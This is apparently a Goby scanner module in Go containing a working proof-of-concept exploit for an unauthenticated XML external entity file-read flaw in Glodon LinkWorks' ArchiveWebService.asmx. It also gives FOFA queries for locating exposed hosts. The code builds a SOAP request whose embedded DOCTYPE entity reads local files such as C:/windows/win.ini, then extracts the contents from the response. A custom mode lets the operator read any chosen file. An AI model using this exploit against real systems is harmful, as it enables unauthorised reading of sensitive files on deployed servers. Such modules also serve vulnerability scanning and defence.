package exploits

import (
	"fmt"
	"html"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Glodon Linkworks ArchiveWebService File Read Vulnerability",
    "Description": "<p>Glodon LinkWorks (also known as GlinkLink or GTP-LinkWorks) is a BIM (Building Information Modeling) collaboration platform developed by Glodon. Glodon is one of the leading digital construction technology providers in China, focusing on providing digital solutions for the construction, engineering and architectural design industries. </p><p>Glodon LinkWorks/GB/LK/Document/ArchiveService/ArchiveWebService asmx interface XML entity exists injection vulnerabilities, unauthenticated attacker can be read using this vulnerability system is sensitive to internal documents, access to sensitive information, Leaving the system in an extremely unsafe state.</p>",
    "Product": "GTP-LinkWorks",
    "Homepage": "https://www.glodon.com/index.html",
    "DisclosureDate": "2024-07-22",
    "PostTime": "2024-07-25",
    "Author": "1215816861@qq.com",
    "FofaQuery": "body=\"JS/login.js\" && body=\"Services/Identification/login.ashx\" || body=\"GTPTDT.ASPX\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "GobyQuery": "body=\"JS/login.js\" && body=\"Services/Identification/login.ashx\" || body=\"GTPTDT.ASPX\" || body=\"images/GTP_Infobig.png\" || banner=\"Services/Identification/login.ashx\" || header=\"GTP_IdServer_LangID\"",
    "Level": "1",
    "Impact": "<p>Glodon LinkWorks/GB/LK/Document/ArchiveService/ArchiveWebService asmx interface XML entity exists injection vulnerabilities, unauthenticated attacker can be read using this vulnerability system is sensitive to internal documents, access to sensitive information, Leaving the system in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update: <a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "广联达 Linkworks ArchiveWebService 文件读取漏洞",
            "Product": "GTP-LinkWorks",
            "Description": "<p>广联达&nbsp;LinkWorks（也称为 GlinkLink 或 GTP-LinkWorks）是广联达公司（Glodon）开发的一种BIM（建筑信息模型）协同平台。广联达是中国领先的数字建造技术提供商之一，专注于为建筑、工程和建筑设计行业提供数字化解决方案。<br></p><p>广联达 LinkWorks /GB/LK/Document/ArchiveService/ArchiveWebService.asmx接口处存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a><span></span></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。&nbsp;</p>",
            "Impact": "<p>广联达 LinkWorks /GB/LK/Document/ArchiveService/ArchiveWebService.asmx接口处存在XML实体注入漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Glodon Linkworks ArchiveWebService File Read Vulnerability",
            "Product": "GTP-LinkWorks",
            "Description": "<p>Glodon LinkWorks (also known as GlinkLink or GTP-LinkWorks) is a BIM (Building Information Modeling) collaboration platform developed by Glodon. Glodon is one of the leading digital construction technology providers in China, focusing on providing digital solutions for the construction, engineering and architectural design industries.&nbsp;</p><p>Glodon LinkWorks/GB/LK/Document/ArchiveService/ArchiveWebService asmx interface XML entity exists injection vulnerabilities, unauthenticated attacker can be read using this vulnerability system is sensitive to internal documents, access to sensitive information, Leaving the system in an extremely unsafe state.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:&nbsp;<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Glodon LinkWorks/GB/LK/Document/ArchiveService/ArchiveWebService asmx interface XML entity exists injection vulnerabilities, unauthenticated attacker can be read using this vulnerability system is sensitive to internal documents, access to sensitive information, Leaving the system in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10975"
}`

	postOrGet_fdsijfiojdsg0s9s9fdppaos9 := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		payload := `<!DOCTYPE Archive [
      <!ENTITY secret SYSTEM "file://` + fileUrl + `">
  ]>
  
  <Archive>  
      <ArchiveInfo>  
          <UploaderID>
  ############
  
  
  &secret;
  
  
  ##############
  </UploaderID>  
      </ArchiveInfo>  
      <Result>  
          <MainDoc>Document Content</MainDoc>  
      </Result>  
      <DocInfo>  
          <DocTypeID>1</DocTypeID>  
          <DocVersion>1.0</DocVersion>  
      </DocInfo>  
  </Archive>`
		data := `<?xml version="1.0" encoding="utf-8"?>
		    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
		      <soap:Body>
		        <PostArchiveInfo xmlns="http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx">
		          <archiveInfo>` + html.EscapeString(payload) + `</archiveInfo>
		    <folderIdList>string</folderIdList>
		    <platId>string</platId>
		  </PostArchiveInfo>
		</soap:Body>
		</soap:Envelope>
		`

		path := "/GB/LK/Document/ArchiveService/ArchiveWebService.asmx"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Content-Type":    "text/xml; charset=utf-8",
			"SOAPAction":      `"http://GB/LK/Document/ArchiveService/ArchiveWebService.asmx/PostArchiveInfo"`,
		}
		resp, err := setPostRequest(hostInfo, path, data, header)
		if err != nil || resp.StatusCode != 500 {
			return "", err
		}

		RegularUrl := ` ############([\s\S]*?)##############`
		reRequest := regexp.MustCompile(RegularUrl)
		if !reRequest.MatchString(resp.RawBody) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequest.FindStringSubmatch(resp.RawBody)
		getname1 := strings.Split(getname[1], "##############")[0]
		for getname1[0:1] == "\n" || getname1[0:1] == " " {
			getname1 = strings.TrimLeft(getname1, "\n")
			getname1 = strings.TrimSpace(getname1)
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return getname1, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/GB/LK/Document/ArchiveService/ArchiveWebService.asmx"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"C:/windows/win.ini": "[extensions]"}
			// 函数继承
			uploadFileFunc := postOrGet_fdsijfiojdsg0s9s9fdppaos9

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"C:/windows/win.ini", "[extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_fdsijfiojdsg0s9s9fdppaos9

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
